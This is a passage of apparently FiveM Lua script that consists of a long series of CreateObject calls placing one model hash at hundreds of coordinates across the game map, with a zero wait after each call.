        CreateObject(4185368029, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(4185368029, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
